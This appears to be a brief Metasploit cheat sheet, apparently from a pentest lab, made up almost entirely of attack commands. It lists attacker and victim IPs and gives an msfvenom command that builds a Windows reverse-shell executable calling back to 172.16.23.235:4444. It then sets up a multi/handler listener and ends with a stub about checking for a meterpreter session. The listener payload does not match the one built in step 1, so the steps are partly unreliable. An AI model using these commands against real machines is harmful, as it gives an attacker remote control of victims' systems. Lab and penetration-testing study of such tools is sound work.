# Metasploit
```
Attacker 192.168.0.99
Victim   192.168.0.5
         192.168.1.5
Target   192.168.1.63
```

## Step 1: Create Windows Payload
```
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=172.16.23.235 LPORT=4444 >payload.exe
```

## Step 2: Listener 
```
msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.23.235
LHOST => 172.16.23.235
msf exploit(handler) > exploit
```

## Step 3: Check meterpreter session
```
/* 
 * - check msf for new meterpreter session
 */